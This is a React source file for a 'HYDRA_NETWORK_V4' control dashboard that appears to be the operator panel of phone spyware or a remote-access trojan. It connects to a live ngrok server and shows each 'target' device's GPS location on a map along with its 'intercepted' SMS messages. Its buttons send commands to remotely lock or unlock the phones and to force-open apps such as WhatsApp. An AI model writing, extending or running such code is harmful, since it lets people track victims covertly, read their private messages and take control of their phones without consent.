import React, { useEffect, useState } from 'react';
import { MapContainer, TileLayer, Marker, Popup, useMap } from 'react-leaflet';
import io from 'socket.io-client';
import 'leaflet/dist/leaflet.css';
import L from 'leaflet';

const pulsingStyle = `
  @keyframes pulse {
    0% { transform: scale(1); opacity: 1; box-shadow: 0 0 0 0 rgba(0, 255, 65, 0.7); }
    70% { transform: scale(1.2); opacity: 0.8; box-shadow: 0 0 0 15px rgba(0, 255, 65, 0); }
    100% { transform: scale(1); opacity: 1; box-shadow: 0 0 0 0 rgba(0, 255, 65, 0); }
  }
  .neon-pulse { background: #00ff41; width: 12px; height: 12px; border-radius: 50%; border: 2px solid #fff; animation: pulse 2s infinite; }
`;

const hackerIcon = new L.DivIcon({
  className: 'custom-icon',
  html: `<div class="neon-pulse"></div>`,
  iconSize: [12, 12],
  iconAnchor: [6, 6],
});

function RecenterMap({ coords }) {
  const map = useMap();
  useEffect(() => {
    if (coords?.lat) map.setView([coords.lat, coords.lon], 17);
  }, [coords, map]);
  return null;
}

export default function App() {
  const [devices, setDevices] = useState({});
  const [socket, setSocket] = useState(null);
  const [selectedId, setSelectedId] = useState(null);
  const [packageName, setPackageName] = useState("");

  useEffect(() => {
    const s = io('https://subopaquely-podophyllic-nicola.ngrok-free.dev', {
      transports: ['websocket'],
      extraHeaders: { "ngrok-skip-browser-warning": "true" }
    });
    setSocket(s);
    s.on('dataUpdate', (payload) => {
      setDevices(prev => {
        const newDevices = { ...prev, [payload.deviceId]: payload };
        if (!selectedId) setSelectedId(payload.deviceId);
        return newDevices;
      });
    });
    return () => s.disconnect();
  }, [selectedId]);

  const sendCommand = (id, cmd, extra = null) => {
  if (socket) {
    // We create a payload that includes the deviceId and the command
    const payload = { deviceId: id, command: cmd };
    
    // If we are opening an app, we add the packageName to the message
    if (extra) payload.packageName = extra; 
    
    socket.emit('command', payload);
    console.log(`Sending ${cmd} to ${id} with data: ${extra}`);
  }
};
  const activeDevice = devices[selectedId];

  return (
    <div style={styles.appContainer}>
      <style>{pulsingStyle}</style>

      <div style={styles.sidebar}>
        <h1 style={styles.header}>&gt; HYDRA_NETWORK_V4</h1>
        
        {/* MULTI-DEVICE SELECTOR SECTION */}
        <div style={styles.deviceSelector}>
          <p style={styles.label}>_ACTIVE_NODES [{Object.keys(devices).length}]:</p>
          <div style={styles.deviceList}>
            {Object.keys(devices).map(id => (
              <div 
                key={id} 
                onClick={() => setSelectedId(id)}
                style={{
                  ...styles.deviceTab, 
                  borderColor: selectedId === id ? '#00ff41' : '#004400',
                  background: selectedId === id ? 'rgba(0, 255, 65, 0.1)' : 'transparent'
                }}
              >
                {selectedId === id ? '> ' : ''} NODE_{id.slice(0, 6)}
              </div>
            ))}
          </div>
        </div>

        {activeDevice ? (
          <div style={styles.targetCard}>
            <div style={styles.cardHeader}>
              <span style={styles.targetId}>[ TARGET: {activeDevice.deviceId.slice(0, 12)} ]</span>
              <span style={styles.onlineDot}>● ONLINE</span>
            </div>

            {/* FORCE OPEN APP COLUMN */}
            <div style={styles.actionSection}>
              <p style={styles.label}>_APP_INJECTION:</p>
              <div style={{display: 'flex', gap: '5px'}}>
                <input 
                  type="text" 
                  placeholder="package.name (e.g. com.whatsapp)" 
                  style={styles.hackInput}
                  value={packageName}
                  onChange={(e) => setPackageName(e.target.value)}
                />
                <button 
                  onClick={() => sendCommand(activeDevice.deviceId, 'openApp', packageName)} 
                  style={styles.btnLaunch}
                >
                  RUN
                </button>
              </div>
            </div>

            <div style={styles.smsBox}>
              <p style={styles.label}>_INTERCEPTED_LOGS:</p>
              {activeDevice.sms?.map((msg, i) => (
                <div key={i} style={styles.smsMsg}>- {msg}</div>
              ))}
            </div>

            <div style={styles.btnGroup}>
              <button onClick={() => sendCommand(activeDevice.deviceId, 'freeze')} style={styles.btnRed}>FORCE_LOCK</button>
              <button onClick={() => sendCommand(activeDevice.deviceId, 'unfreeze')} style={styles.btnGreen}>BYPASS</button>
            </div>
          </div>
        ) : (
          <div style={styles.scanning}>LISTENING_FOR_INCOMING_PACKETS...</div>
        )}
      </div>

      <div style={styles.mapArea}>
        <MapContainer center={[17.385, 78.486]} zoom={13} style={{ height: '100%', width: '100%' }}>
          <TileLayer url="https://{s}.basemaps.cartocdn.com/rastertiles/voyager_labels_under/{z}/{x}/{y}{r}.png" />
          {Object.values(devices).map(d => (
            <Marker key={d.deviceId} position={[d.location.lat, d.location.lon]} icon={hackerIcon}>
              <Popup><div style={styles.popup}>NODE: {d.deviceId.slice(0,8)}</div></Popup>
            </Marker>
          ))}
          {activeDevice && <RecenterMap coords={activeDevice.location} />}
        </MapContainer>
      </div>
    </div>
  );
}

const styles = {
  appContainer: { display: 'flex', height: '100vh', width: '100vw', background: '#000', color: '#00ff41', fontFamily: 'monospace' },
  sidebar: { width: '400px', background: '#050505', padding: '20px', borderRight: '2px solid #00ff41', overflowY: 'auto' },
  header: { fontSize: '20px', letterSpacing: '2px', textShadow: '2px 0 #ff0000, -2px 0 #0000ff', marginBottom: '20px' },
  deviceSelector: { marginBottom: '20px', borderBottom: '1px solid #004400', paddingBottom: '15px' },
  deviceList: { display: 'flex', flexWrap: 'wrap', gap: '8px', marginTop: '10px' },
  deviceTab: { padding: '5px 10px', border: '1px solid', fontSize: '10px', cursor: 'pointer', color: '#00ff41' },
  targetCard: { border: '1px solid #00ff41', padding: '15px', background: 'rgba(0, 255, 65, 0.05)' },
  cardHeader: { display: 'flex', justifyContent: 'space-between', marginBottom: '15px' },
  targetId: { fontWeight: 'bold' },
  onlineDot: { fontSize: '10px' },
  actionSection: { marginBottom: '15px' },
  hackInput: { flex: 1, background: '#000', border: '1px solid #00ff41', color: '#00ff41', padding: '8px', fontSize: '11px', fontFamily: 'monospace' },
  btnLaunch: { background: '#00ff41', color: '#000', border: 'none', padding: '0 15px', cursor: 'pointer', fontWeight: 'bold' },
  smsBox: { background: '#000', border: '1px solid #004400', padding: '10px', height: '150px', overflowY: 'auto' },
  label: { fontSize: '10px', color: '#00ff41', marginBottom: '5px', textTransform: 'uppercase' },
  smsMsg: { fontSize: '11px', color: '#008f11', marginBottom: '8px', borderBottom: '1px solid #002200' },
  btnGroup: { display: 'flex', gap: '10px', marginTop: '15px' },
  btnRed: { flex: 1, background: 'transparent', border: '1px solid #ff0000', color: '#ff0000', padding: '10px', cursor: 'pointer' },
  btnGreen: { flex: 1, background: 'transparent', border: '1px solid #00ff41', color: '#00ff41', padding: '10px', cursor: 'pointer' },
  mapArea: { flex: 1 },
  scanning: { textAlign: 'center', marginTop: '50px', color: '#004400' },
  popup: { background: '#000', color: '#00ff41', fontFamily: 'monospace' }
};